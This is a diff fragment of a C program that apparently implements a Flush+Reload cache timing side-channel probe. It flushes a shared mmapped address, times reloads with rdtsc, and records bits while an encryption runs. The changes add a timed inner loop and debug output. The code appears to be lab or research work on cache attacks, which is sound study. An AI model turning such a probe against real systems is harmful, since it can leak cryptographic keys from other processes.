@@ -1,4 +1,4 @@
-#include <stdio.h>
+ #include <stdio.h>
 #include <stdint.h>
 #include <unistd.h>
 #include <stdlib.h>
@@ -85,17 +85,23 @@ int main(int argc, char *argv[])
         map_size |= 0xFFF;
         map_size += 1;
     }
-      char *base = (char *)mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
+    
+    char *base = (char *)mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
     char *probe = base;
     uint64_t min_time = rdtsc();
     srand(min_time);
+    long int x=0;
+    size_t time1, time2;
+
 
     printf("====================================================\n");
     
     debug_flag = true;
     for (int i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i) {
          
-        while (n<8) { 
+         while (n<8){
+         time1 = rdtsc();
+       do { 
         if (debug_flag)
             printf("Flusing the base address ... .. ...\n");
         flush(probe);
@@ -108,6 +114,7 @@ int main(int argc, char *argv[])
         size_t delta = rdtsc() - time;
         
         printf(" \n \n %lld cyccles of delta .. \n",delta);
+        
         if (delta > MIN_CACHE_MISS_CYCLES)
         {
             reading[i][n] = '0';
@@ -116,8 +123,13 @@ int main(int argc, char *argv[])
         	reading[i][n] = '1';
         }
         
-        n++;
-        }
+        printf("\n iteration : %ld ",x++);
+        printf("\n\n value : %c ",reading[i][n]);
+        
+       
+        } while ((rdtsc()-time1)<450);
+         n++;
+         }
         n=0;
         
        // debug_flag = false;
